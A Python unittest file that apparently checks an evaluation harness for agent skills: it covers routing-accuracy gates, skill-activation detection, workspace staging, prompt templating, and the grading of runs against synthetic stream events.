    def gate(self, passed: int, graded: int, bar: float = 1.0, **extra) -> str | None:
        return cli.routing_gate(self.totals(passed, graded, **extra), bar)

    def test_the_default_bar_is_every_graded_case(self) -> None:
        self.assertEqual(cli.build_parser().parse_args(["routing"]).min_accuracy, 1.0)

    def test_a_clean_sweep_passes(self) -> None:
        self.assertIsNone(self.gate(12, 12))

    def test_one_wrong_decision_fails(self) -> None:
        reason = self.gate(11, 12)
        self.assertIn("11/12", reason)
        self.assertIn("--min-accuracy", reason)

    def test_an_accuracy_that_rounds_up_does_not_slip_through(self) -> None:
        # The reported figure is rounded to three places, so one miss in a big
        # enough set prints as a clean 1.0. The bar is held against the ratio.
        totals = self.totals(3999, 4000)
        self.assertEqual(totals["accuracy"], 1.0)
        self.assertIsNotNone(cli.routing_gate(totals, 1.0))

    def test_zero_reports_the_score_without_gating(self) -> None:
        self.assertIsNone(self.gate(1, 12, bar=0))

    def test_a_bar_short_of_perfect_is_kept_to_the_letter(self) -> None:
        self.assertIsNone(self.gate(9, 10, bar=0.9))
        self.assertIsNotNone(self.gate(8, 10, bar=0.9))

    def test_a_case_that_errored_is_outside_the_bar(self) -> None:
        # Errors are excluded from accuracy -- a timeout is not a routing
        # verdict -- so a perfect score over what was graded still passes.
        self.assertIsNone(self.gate(11, 11, cases=12, errors=1))

    def test_nothing_graded_fails_however_low_the_bar(self) -> None:
        totals = {
            "passed": 0,
            "graded": 0,
            "accuracy": None,
            "activations": 0,
            "activations_expected": 0,
        }
        self.assertIsNotNone(cli.routing_gate(totals, 0.0))

    def test_a_run_where_no_skill_activated_fails_however_low_the_bar(self) -> None:
        self.assertIsNotNone(self.gate(0, 12, bar=0, activations=0))


class TestActivationDetection(unittest.TestCase):
    SKILLS = ["local-ai-use", "local-ai-app-integration", "serving-llms-on-instinct"]

    def event(self, tool: str, tool_input: dict) -> dict:
        return {
            "type": "assistant",
            "message": {"content": [{"type": "tool_use", "name": tool, "input": tool_input}]},
        }

    def test_skill_tool_call_is_an_activation(self) -> None:
        event = self.event("Skill", {"command": "local-ai-use"})
        self.assertEqual(routing.detect_activation(event, self.SKILLS), "local-ai-use")

    def test_longest_name_wins_when_one_is_a_prefix_of_another(self) -> None:
        event = self.event("Skill", {"command": "local-ai-app-integration"})
        self.assertEqual(
            routing.detect_activation(event, self.SKILLS), "local-ai-app-integration"
        )

    def test_a_skill_nobody_installed_is_flagged_not_scored(self) -> None:
        event = self.event("Skill", {"command": "somebody-elses-skill"})
        self.assertEqual(
            routing.detect_activation(event, self.SKILLS), "other:somebody-elses-skill"
        )

    def test_listing_the_installed_skills_is_not_an_activation(self) -> None:
        event = self.event("Bash", {"command": "ls .claude/skills"})
        self.assertIsNone(routing.detect_activation(event, self.SKILLS))

    def test_reading_a_skill_body_counts_only_without_a_skill_tool(self) -> None:
        event = self.event("Read", {"file_path": "/tmp/x/.claude/skills/local-ai-use/SKILL.md"})
        self.assertEqual(
            routing.detect_activation(event, self.SKILLS, allow_body_path=True),
            "local-ai-use",
        )
        self.assertIsNone(
            routing.detect_activation(event, self.SKILLS, allow_body_path=False)
        )

    def test_a_tool_result_listing_every_skill_is_not_an_activation(self) -> None:
        # An empty workspace answers a file hunt with a recursive listing of
        # every SKILL.md; scoring that credited whichever name sorted first.
        event = {
            "type": "user",
            "message": {
                "content": [
                    {
                        "type": "tool_result",
                        "content": "skills/local-ai-use/SKILL.md\nskills/serving-llms-on-instinct/SKILL.md",
                    }
                ]
            },
        }
        self.assertIsNone(routing.detect_activation(event, self.SKILLS))

    def test_inspecting_the_installed_skills_is_recognized(self) -> None:
        self.assertTrue(
            routing._is_skills_inspection('{"path": ".claude/skills"}', self.SKILLS)
        )
        self.assertFalse(routing._is_skills_inspection('{"path": "src/main.py"}', self.SKILLS))


class TestRoutingStaging(unittest.TestCase):
    def test_the_routing_set_lands_in_the_workspace_and_nothing_else(self) -> None:
        repo = Repo(self)
        repo.skill("one", dataset=tier0_dataset("one"))
        repo.skill("two", dataset=tier0_dataset("two"))
        repo.skill("unlisted", dataset=tier0_dataset("unlisted"))
        cfg = repo.activate(routing_skills="one,two")
        workspace = routing.stage_workspace(cfg.routing_set)
        try:
            staged = sorted(p.name for p in (workspace / ".claude" / "skills").iterdir())
            self.assertEqual(staged, ["one", "two"])
            self.assertTrue(
                (workspace / ".claude" / "skills" / "one" / "SKILL.md").is_file()
            )
        finally:
            import shutil

            shutil.rmtree(workspace, ignore_errors=True)


class TestPromptTemplating(unittest.TestCase):
    def test_placeholders_are_substituted(self) -> None:
        self.assertEqual(
            behavior.expand("trace: {trace_path}", {"trace_path": "/tmp/a.json"}),
            "trace: /tmp/a.json",
        )

    def test_literal_braces_survive(self) -> None:
        # Prompts routinely contain JSON snippets and regex quantifiers, which
        # str.format would choke on.
        text = 'produce {"a": 1} and match \\d{3}'
        self.assertEqual(behavior.expand(text, {"x": "y"}), text)


def stream(*tool_calls: tuple[str, dict], result: str = "done") -> list[dict]:
    """Synthetic stream-json events, shaped like the CLI's output."""
    events: list[dict] = [{"type": "system", "subtype": "init", "tools": ["Bash", "Skill"]}]
    for name, tool_input in tool_calls:
        events.append(
            {
                "type": "assistant",
                "message": {"content": [{"type": "tool_use", "name": name, "input": tool_input}]},
            }
        )
    events.append({"type": "result", "result": result})
    return events


class TestRunGrading(unittest.TestCase):
    """Deterministic grading only; the judged fields need a live judge."""

    def setUp(self) -> None:
        self.tmp = tempfile.TemporaryDirectory()
        self.workspace = Path(self.tmp.name)
        self.addCleanup(self.tmp.cleanup)

    def make_run(self, events: list[dict]) -> agent.Run:
        return agent.Run(workspace=self.workspace, events=events, judge_model=None)

    def test_transcript_and_tools_are_captured(self) -> None:
        run = self.make_run(stream(("Bash", {"command": "python detect.py"})))
        self.assertIn("Bash", run.tool_names)
        self.assertIn("detect.py", run.logs)
        self.assertEqual(run.result_text, "done")

    def test_logs_contain_is_case_insensitive(self) -> None:
        run = self.make_run(stream(("Bash", {"command": "python DETECT.py"})))
        checks = run.evaluate(logs_contain=["detect.py"])
        self.assertTrue(checks[0].passed)

    def test_logs_contain_reports_a_miss(self) -> None:
        run = self.make_run(stream(("Bash", {"command": "ls"})))
        checks = run.evaluate(logs_contain=["detect.py"])
        self.assertFalse(checks[0].passed)

    def test_files_exist(self) -> None:
        (self.workspace / "out.png").write_bytes(b"x")
        checks = self.make_run(stream()).evaluate(files_exist=["out.png", "missing.txt"])
        self.assertTrue(checks[0].passed)
        self.assertFalse(checks[1].passed)

    def test_files_exist_finds_the_artifact_in_a_subdirectory(self) -> None:
        # Where a plan lands is the agent's call; asking for `plan.md` and
        # getting `examples/fixture/plan.md` is a pass, not a defect.
        nested = self.workspace / "examples" / "fixture"
        nested.mkdir(parents=True)
        (nested / "plan.md").write_text("x", encoding="utf-8")
        checks = self.make_run(stream()).evaluate(files_exist=["plan.md"])
        self.assertTrue(checks[0].passed)
        self.assertIn("examples/fixture/plan.md", checks[0].detail)

    def test_files_exist_matches_whole_segments_only(self) -> None:
        (self.workspace / "analyze_plan.md").write_text("x", encoding="utf-8")
        checks = self.make_run(stream()).evaluate(files_exist=["plan.md"])
        self.assertFalse(checks[0].passed)

    def test_files_exist_keeps_the_directory_context_it_was_given(self) -> None:
        deep = self.workspace / "run-1" / "analysis_output"
        deep.mkdir(parents=True)
        (deep / "analysis.md").write_text("x", encoding="utf-8")
        (self.workspace / "analysis.md").write_text("x", encoding="utf-8")
        run = self.make_run(stream())
        self.assertTrue(run.evaluate(files_exist=["analysis_output/analysis.md"])[0].passed)
        self.assertFalse(run.evaluate(files_exist=["other_output/analysis.md"])[0].passed)

    def test_files_exist_ignores_a_directory_of_the_wanted_name(self) -> None:
        (self.workspace / "out.png").mkdir()
        checks = self.make_run(stream()).evaluate(files_exist=["out.png"])
        self.assertFalse(checks[0].passed)

    def test_every_expectation_is_reported_not_just_the_first(self) -> None:
        # A run that cost minutes should not have to be repeated to discover
        # the second thing wrong with it.
        checks = self.make_run(stream()).evaluate(
            logs_contain=["nope"], files_exist=["also-nope"]
        )
        self.assertEqual(len(checks), 2)
        self.assertFalse(any(c.passed for c in checks))

    def test_dot_claude_is_excluded_from_workspace_listing(self) -> None:
        staged = self.workspace / ".claude" / "skills" / "demo"
        staged.mkdir(parents=True)
        (staged / "SKILL.md").write_text("x", encoding="utf-8")
        (self.workspace / "out.png").write_bytes(b"x")
        self.assertEqual(self.make_run(stream()).files, ["out.png"])


class FakeAgent:
    """Stands in for a real agent session so the flow can be tested offline."""

    def __init__(self, events: list[dict], seed: Path | None) -> None:
        self.events = events
        self.seed = seed
        self.workspace: Path | None = None
        self.prompts: list[str] = []
        self._tmp: tempfile.TemporaryDirectory | None = None

    def __enter__(self) -> "FakeAgent":
        self._tmp = tempfile.TemporaryDirectory()
        self.workspace = Path(self._tmp.name)
        if self.seed is not None:
            for path in self.seed.iterdir():
                (self.workspace / path.name).write_bytes(path.read_bytes())
        return self

    def __exit__(self, *exc) -> None:
        if self._tmp is not None:
            self._tmp.cleanup()

    def prompt(self, text: str):
        self.prompts.append(text)
        return agent.Run(workspace=self.workspace, events=self.events, judge_model=None)


class TestBehaviorCaseFlow(unittest.TestCase):
    """The hook contract and prompt templating, without spending tokens."""

    def setUp(self) -> None:
        self.repo = Repo(self)
        self.repo.skill(
            "demo-skill",
            dataset=tier0_dataset("demo"),
            workspace={"evals/files/stub/main.py": "print('hi')\n"},
        )
        self.repo.activate()

    def run_case(self, case_payload: dict, hooks=None, events=None, skill="demo-skill"):
        cases, errors = parse(triggers(**case_payload), skill=skill)
        self.assertEqual(errors, [])
        made: list[FakeAgent] = []

        def fake_claude(model, *, skill, effort, seed=None):
            made.append(FakeAgent(events or stream(), seed))
            return made[-1]

        original = behavior.claude
        behavior.claude = fake_claude
        try:
            outcome = behavior.run_case(cases[0], {}, hooks, "opus", "high")
        finally:
            behavior.claude = original
        return outcome, made[0]

    def test_a_passing_case(self) -> None:
        outcome, session = self.run_case(
            {"id": "a", "prompt": "run it", "logs_contain": ["detect.py"]},
            events=stream(("Bash", {"command": "detect.py"})),
        )
        self.assertTrue(outcome.passed)
        self.assertEqual(session.prompts, ["run it"])

    def test_a_failing_expectation_fails_the_case(self) -> None:
        outcome, _ = self.run_case({"id": "a", "prompt": "run it", "logs_contain": ["nope"]})
        self.assertFalse(outcome.passed)

    def test_hooks_run_in_order_and_can_template_the_prompt(self) -> None:
        calls: list[str] = []

        class Hooks:
            @staticmethod
            def setup(workspace, case, ctx):
                calls.append("setup")
                return {"output_dir": workspace / "out"}

            @staticmethod
            def check(run, case, ctx):
                calls.append("check")

            @staticmethod
            def teardown(workspace, case, ctx):
                calls.append("teardown")

        outcome, session = self.run_case(
            {"id": "a", "prompt": "write to {output_dir}", "logs_contain": ["detect"]},
            hooks=Hooks,
            events=stream(("Bash", {"command": "detect"})),
        )
        self.assertEqual(calls, ["setup", "check", "teardown"])
        self.assertNotIn("{output_dir}", session.prompts[0])
        self.assertTrue(outcome.passed)

    def test_a_raising_hook_check_fails_the_case_without_killing_the_run(self) -> None:
        class Hooks:
            @staticmethod
            def check(run, case, ctx):
                raise AssertionError("scorer reported 3 failures")

        outcome, _ = self.run_case({"id": "a", "prompt": "p", "logs_contain": []}, hooks=Hooks)
        self.assertFalse(outcome.passed)
        self.assertTrue(any("scorer reported" in c["detail"] for c in outcome.checks))

    def test_teardown_runs_even_when_the_agent_raises(self) -> None:
        calls: list[str] = []

        class Hooks:
            @staticmethod
            def teardown(workspace, case, ctx):
                calls.append("teardown")

        class Exploding(FakeAgent):
            def prompt(self, text):
                raise RuntimeError("claude produced no output")

        cases, _ = parse(triggers(id="a", prompt="p", unexpected_behavior=["x"]))
        original = behavior.claude
        behavior.claude = lambda model, *, skill, effort, seed=None: Exploding(stream(), seed)
        try:
            outcome = behavior.run_case(cases[0], {}, Hooks, "opus", "high")
        finally:
            behavior.claude = original
        self.assertEqual(calls, ["teardown"])
        self.assertFalse(outcome.passed)
        self.assertIn("claude produced no output", outcome.error)

    def test_workspace_fixtures_are_staged(self) -> None:
        outcome, _ = self.run_case(
            {
                "id": "a",
                "prompt": "edit it",
                "workspace": "evals/files/stub",
                "files_exist": ["main.py"],
            }
        )
        self.assertTrue(outcome.passed, outcome.checks)


class TestBehaviorReporting(unittest.TestCase):
    def test_summary_counts_cases_and_expectations(self) -> None:
        outcomes = [
            behavior.BehaviorOutcome(
                id="a",
                skill="s",
                prompt="p",
                passed=True,
                elapsed_s=1.0,
                checks=[
                    {"kind": "logs_contain", "expectation": "x", "passed": True, "detail": ""}
                ],
            ),
            behavior.BehaviorOutcome(
                id="b",
                skill="s",
                prompt="p",
                passed=False,
                elapsed_s=1.0,
                checks=[
                    {
                        "kind": "expected_behavior",
                        "expectation": "y",
                        "passed": False,
                        "detail": "no",
                    }
                ],
            ),
        ]
        summary = behavior.summarize(outcomes, {"model": "opus", "effort": "high"})
        self.assertEqual(
            summary["totals"],
            {"cases": 2, "passed": 1, "checks": 2, "checks_passed": 1, "errors": 0},
        )
        report = behavior.render_markdown(summary)
        self.assertIn("1/2 cases passed", report)
        self.assertIn("`b`", report)


class TestCaseFiltering(unittest.TestCase):
    def setUp(self) -> None:
        self.cases, _ = parse(
            {
                EVALUATIONS_KEY: [
                    {"id": "a", TRIGGER_KEY: True, "prompt": "p"},
                    {"id": "b", TRIGGER_KEY: True, "prompt": "q"},
                ]
            },
            skill="demo-skill",
        )

    def test_filter_by_id(self) -> None:
        self.assertEqual([c.id for c in datasets.filter_cases(self.cases, "a")], ["a"])

    def test_filter_by_skill(self) -> None:
        self.assertEqual(len(datasets.filter_cases(self.cases, "demo-skill")), 2)

    def test_empty_filter_keeps_everything(self) -> None:
        self.assertEqual(len(datasets.filter_cases(self.cases, "")), 2)

    def test_no_match_is_an_error(self) -> None:
        with self.assertRaises(SystemExit):
            datasets.filter_cases(self.cases, "nope")


class TestRoutingCasePooling(unittest.TestCase):
    """A routing run grades the listed skills' prompts, and the shared pool."""

    def setUp(self) -> None:
        self.repo = Repo(self)
        self.repo.skill("listed", dataset=tier0_dataset("listed"))
        self.repo.skill("unlisted", dataset=tier0_dataset("unlisted"))
        self.repo.activate(routing_skills="listed")

    def test_a_listed_skill_brings_both_kinds_of_prompt(self) -> None:
        # Its positives are the room's positives; its near misses assert that
        # nothing in the room grabs them.
        ids = {case.id for case in datasets.routing_cases(["listed"])}
        self.assertIn("listed-yes-0", ids)
        self.assertIn("listed-no-0", ids)

    def test_an_unlisted_skill_brings_none(self) -> None:
        # It is not in the room, so a prompt expecting it could only ever lose,
        # and its near misses assert nothing about the skills that are there.
        cases = datasets.routing_cases(["listed"])
        self.assertFalse(any(case.skill == "unlisted" for case in cases))

    def test_the_shared_pool_is_always_in(self) -> None:
        cases = datasets.routing_cases(["listed"])
        self.assertTrue(any(case.category == "unrelated" for case in cases))

    def test_an_empty_room_leaves_only_the_shared_pool(self) -> None:
        cases = datasets.routing_cases([])
        self.assertTrue(cases)
        self.assertTrue(all(case.skill is None for case in cases))


if __name__ == "__main__":
    unittest.main(verbosity=2)
